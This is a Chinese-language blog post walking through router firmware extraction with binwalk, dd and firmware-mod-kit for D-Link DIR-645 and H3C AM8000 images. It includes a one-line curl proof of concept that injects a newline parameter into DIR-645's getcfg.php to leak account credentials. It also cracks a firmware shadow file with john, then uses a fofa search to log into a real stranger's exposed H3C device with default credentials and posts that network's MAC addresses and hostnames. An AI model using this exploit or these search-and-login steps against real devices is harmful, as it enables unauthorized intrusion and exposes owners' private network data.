---
layout: about
category: about
Researchname: Router-BinFile-Analysis
permalink: /about/Router-BinFile-Analysis/
toc: true
---

本文主要记录了Router固件提取的过程，丰富相关从业方向的经验；也是第一个跟着教程提取出的固件，过程有些曲折，分享一些心路历程和提取思路。

- VM Ubuntu 18
- Binwalk
- [firmware-mod-kit](https://github.com/mirror/firmware-mod-kit){:target="_blank"}

Ubuntu 本地VM镜像安装、换源什么的就不赘述了；需要了解的朋友移步搜索引擎；

## 零：*DLink-DIR645A1_FW102B08*

- 下载地址：[*DLink - ftp.dlink.ru node*](https://ftp.dlink.ru/pub/Router/DIR-645/Firmware/Old/){:target="_blank"}

下载`bin`后缀的文件；路由器固件可以理解为一个嵌入式系统，是路由器所使用的操作系统，我们日常中使用的像本文中提及到的Ubuntu 18在虚拟机中运行占用容量动辄2G以上，路由器主要功能为拨号、无线等上网用途，功能较为单一，所以主流Linux/BSD发行版镜像则不适用，所以市面上有很多魔改的、适用于路由器的嵌入式系统；

$${Tips.来自维基百科^{[1]}}$$

- 基于Linux
	- OpenWrt
		- Commotion Wireless
	- DebWRT
	- HyperWRT
	- Padavan
	- ...
- 基于BSD Unix内核
	- FreeBSD - 自由及开放源代码操作系统（采用BSD授权条款）
		- zrouter
		- BSD Router Project
		- m0n0wall
		- pfsense
		- OPNsense

背景就介绍一些，有兴趣可以移步[*WIKI PEDIA [1]*](https://zh.m.wikipedia.org/wiki/%E5%AE%A2%E8%A3%BD%E5%8C%96%E8%B7%AF%E7%94%B1%E5%99%A8%E9%9F%8C%E9%AB%94%E6%B8%85%E5%96%AE){:target="_blank"}

所以此时我们就拿到了`DIR645A1_FW102B08`版本的固件，拿到*快递*的第一步当然是拆快递；

### 0x01：手动提取*hsqs systemfiles*

> *Tips：*
>
> > Squashfs（.sfs）是一套供Linux核心使用的GPL开源只读压缩文件系统，具有超高压缩率，其压缩率最高可达34%。

手动判断文件类型：

> 1) `strings | grep` 检索文件系统magic签名头
>
> 2) `hexdump | grep` 检索magic签名偏移
>
> 3) `dd | file` 确定magic签名偏移处的文件类型

#### # *Why hsqs?*

- 问：为什么是在文件中检索`hsqs`？
- 回答：可识别字符特征

例如我们可以通过`JSESSIONID COOKIE`来判断出这是一个J2EE系统，但是我们并不能判断这个系统是否集成了`Apache Shiro`，所以我们需要进一步通过`rememeberMe COOKIE`来判断，更有甚者则需要通过[人工来寻找路由判断](/about/JRMP-Gadget/){:target="_blank"}；

所以此处的文件类型判断同样，文件系统magic签名头是指一个文件系统中包含的一串可识别字符，有了这串字符，表明该文件可能包含某个文件系统；当然，如果要确定是否包含某文件系统，还需要利用其他条件配合证明，也就是2、3步骤需要做。

#### # 寻找这个快递的运单:)

```bash
➜ strings DIR645A1_FW102B08.bin | grep "hsqs"             
hsqs

➜ hexdump -C DIR645A1_FW102B08.bin | grep -n "hsqs"
88066:00160090  68 73 71 73 a3 07 00 00  29 64 cc 4e 00 00 01 00  |hsqs....)d.N....|
```
在偏移`0x160090`发现了`hsqs`，16进制转化为10进制得**1441936**，复制签名偏移的文件类型大小 ≤ *100bytes*即可：

> *Tips：*
>
> > 通常复制100字节的数据，是因为squashfs文件系统的头部校验不会超过100字节
> > 简而言之：此处提取出来的100字节大小的squash可以类比成快递运单，运单上详细记录着快递类型、快递大小等托运物相关信息；

```bash
➜ dd if=DIR645A1_FW102B08.bin bs=1 count=100 skip=1441936 of=squash
100+0 records in
100+0 records out
100 bytes copied, 0.0387127 s, 2.6 kB/s

➜ file squash 
squash: Squashfs filesystem, little endian, version 4.0, 5958022 bytes, 1955 inodes, blocksize: 65536 bytes, created: Wed Nov 23 03:10:33 2011
```
我们看到运单显示：`类型 Squashfs filesystem ，大小 5958022 bytes ，创建时间 Wed Nov 23 03:10:33 2011`，当然这也是我们下一步所需要的参数；

`dd if=DIR645A1_FW102B08.bin bs=1 count=5958022 skip=1441936 of=kernel.squash`命令输出数据文件


#### # 打开快递盒子:)

用到的工具：[firmware-mod-kit](https://github.com/mirror/firmware-mod-kit){:target="_blank"}
```bash
$ git clone https://github.com/mirror/firmware-mod-kit.git
$ sudo apt-get install build-essential zlib1g-dev liblzma-dev python-magic
$ cd firmware-mod-kit/src
$ ./configure && make
##这里顺便一提：ln: failed to create hard link 'uncomp_r.c' => 'uncomp.c': Operation not permitted
##报错是操作不被允许，因为我图省事宿主机共享了一个文件夹给虚拟机，make操作都是在共享文件夹下，导致权限存在问题
$ make clean
$ mv firmware-mod-kit/* ~/Desktop/firmware-mod-kit/ && cd firmware-mod-kit/src 
$ ./configure && make
##紧接着直接对kernel.squash进行解包即可
$ cd ../ && ./unsquashfs_all.sh ../kernel.squash
```

![截屏2021-07-14 下午3.39.43.png](https://i.loli.net/2021/07/16/NyGEhMbqeTm3rOQ.png)

上图红字步骤依次从上到下：
- 1.success in local fold.
- 2.make error : ln: failed to create hard link 'uncomp_r.c' => 'uncomp.c': Operation not permitted.
- 3.提取成功

### 0x02 *Binwalk*提取*hsqs systemfiles*

```bash
$ binwalk -Me DIR645A1_FW102B08.bin
$ cd _DIR645A1_FW102B08.bin.extracted/
$ /{path/to/firmware-mod-kit}/unsquashfs_all.sh 160090.squashfs
```
同样解出；
![截屏2021-07-14 下午2.51.53.png](https://i.loli.net/2021/07/16/TJiGF8ov4OW5gNH.png)

图片红字步骤依次从上到下：
- 1.binwalk解出`.squashfs`文件后需手动使用unsquashfs_all脚本解包
- 2.两种方法之间的过程比较

### 0x03 *DIR-645*敏感信息泄露

- `htdocs/web/getcfg.php`

```php
HTTP/1.1 200 OK
Content-Type: text/xml

<?echo "<?";?>xml version="1.0" encoding="utf-8"<?echo "?>";?>
<postxml>
<? include "/htdocs/phplib/trace.php";

if ($_POST["CACHE"] == "true")
{
	echo dump(1, "/runtime/session/".$SESSION_UID."/postxml");
}
else
{
	/* cut_count() will return 0 when no or only one token. */
	$SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
	TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
	$SERVICE_INDEX = 0;
	while ($SERVICE_INDEX < $SERVICE_COUNT)
	{
		$GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
		TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
		if ($GETCFG_SVC!="")
		{
			$file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
			/* GETCFG_SVC will be passed to the child process. */
			if (isfile($file)=="1") dophp("load", $file);
		}
		$SERVICE_INDEX++;
	}
}
?></postxml>
```

![截屏2021-07-16 下午3.55.48.png](https://i.loli.net/2021/07/16/QxocdSr2PITnA9J.png)

`Poc: curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://{ip.addr}:{ip.port}/info/getcfg.php"`

## 一：*H3C-AM8000V100R008*

- 下载地址：[*H3C - AM8000V100R008*](https://download.h3c.com.cn/download.do?id=2280937)

### 1x01 *binwalk*提取*systemfiles*

官网显示是2015年上传的包，下载下来直接在ubuntu里解包`➜ binwalk -Me AM8000V100R008.bin`，尴尬的是所有的文件就直接出来了么

![截屏2021-08-12 下午4.42.31.png](https://i.loli.net/2021/08/12/gZJaWD2EswuilcN.png)

发现`shadow`，解出来看看：`➜ john -format=md5crypt {file/path}  && john --show {file/path}`

![截屏2021-08-12 下午4.45.13.png](https://i.loli.net/2021/08/12/gmQKfkXq5w2nDsA.png)

### 1x02 默认帐号密码

> fofa: userLogin.asp

既然有了默认账号密码，去找找看有没有`幸运儿`，查看`web.config`入口文件为`userLogin.asp`，那就直接指定语法；

#### # 来自杭州的幸运儿

![截屏2021-08-13 上午11.25.22.png](https://i.loli.net/2021/08/13/IoJDbNSjw61398x.png)

不光弱口令，还映射了n个内网端口到公网上，映射出来的端口是Hikvison的视频流端口和web管理，就不贴图了可以参考[Hikvision-ConfigurationFiles-decrypter](/about/Hikvision-ConfigurationFiles-decrypter)；

另外附上部分dhcp指向表自行感受一下：
```
5	F4:83:CD:00:62:CD	192.168.x.7	TL-WDR5600
6	18:87:40:96:43:7F	192.168.x.8	RedmiK305G-2510
7	58:6B:14:26:B4:4C	192.168.x.9	guoqingdeiPhone
8	4C:CC:6A:AA:D0:45	192.168.x.10	wp-pjb
9	74:27:EA:AC:44:2D	192.168.x.11	yjy-jcb
10	40:F2:E9:37:04:96	192.168.x.13	IMM2-40f2e93704
```
当然也是支持`telnet`连接的：

![截屏2021-08-13 上午11.36.26.png](https://i.loli.net/2021/08/13/ZzPJSMpRnKqVNUQ.png)

#### [未完待续...]

## 参考

- [路由器文件系统与提取](https://www.cnblogs.com/blacksunny/p/7208451.html){:target="_blank"}
- [squashFS 文件系统](https://sabersauce.github.io/2016/07/28/squashFS-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/){:target="_blank"}
- [路由器固件下的小试牛刀](https://www.anquanke.com/post/id/245530){:target="_blank"}

